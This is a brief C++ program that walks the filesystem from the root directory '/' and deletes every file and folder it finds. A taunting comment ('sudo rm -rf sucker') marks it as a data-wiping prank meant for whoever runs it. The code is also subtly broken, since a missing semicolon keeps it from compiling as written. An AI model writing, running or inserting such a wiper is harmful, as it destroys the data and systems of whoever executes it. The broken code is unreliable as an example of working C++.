#include <iostream>
#include <filesystem>
#include <string>

namespace fs = std::filesystem;

void deleteDirectory(const std::string& dir) {
        for (const auto& entry : fs::directory_iterator(dir)) {
            if (fs::is_directory(entry)) {
                deleteDirectory(entry.path().string());
            } else {
                fs::remove(entry.path())
            }
        }
        fs::remove_all(dir);
}

int main() {
    std::string rootDir = "/"; //sudo rm -rf sucker
    deleteDirectory(rootDir); 
    return 0;
}
